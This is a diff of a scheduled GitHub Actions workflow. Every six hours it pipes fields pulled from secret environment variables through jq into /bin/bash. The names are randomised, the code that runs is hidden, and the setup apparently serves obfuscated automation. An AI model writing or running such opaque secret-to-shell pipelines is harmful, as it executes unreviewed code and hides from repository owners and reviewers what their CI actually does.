@@ -2,23 +2,22 @@ name: penchunfenyou
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
-jobs:  # 21841
+    - cron: '35 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: penchunfenyou
         env:
-          eqxt9541: ${{ secrets.eqxt9541 }}
+          pe336: ${{ secrets.pe336 }}
         run: |
-          echo $eqxt9541 | jq -r .arxjn39 | /bin/bash
-          echo $ugcu984 | jq -r .qxmg10 | /bin/bash
-          echo $b21 | jq -r .wygjb153 | /bin/bash
-          echo $cxj48744 | jq -r .ckhy5762 | /bin/bash
-          echo $yywb9 | jq -r .f1 | /bin/bash
-          echo $lum182 | jq -r .zhfxv2311 | /bin/bash
-          echo $t60 | jq -r .e732 | /bin/bash
-          echo $x6522 | jq -r .pvkva54 | /bin/bash
+          echo $pe336 | jq -r .hfo325 | /bin/bash
+          echo $joaya0 | jq -r .kz87534 | /bin/bash
+          echo $rqat5 | jq -r .yrbo98 | /bin/bash
+          echo $zqxbf25 | jq -r .rfp410 | /bin/bash
+          echo $op49301 | jq -r .obz0 | /bin/bash
+          echo $fjvvk5 | jq -r .xrpd84405 | /bin/bash
+          echo $eatox3 | jq -r .m4840 | /bin/bash
 
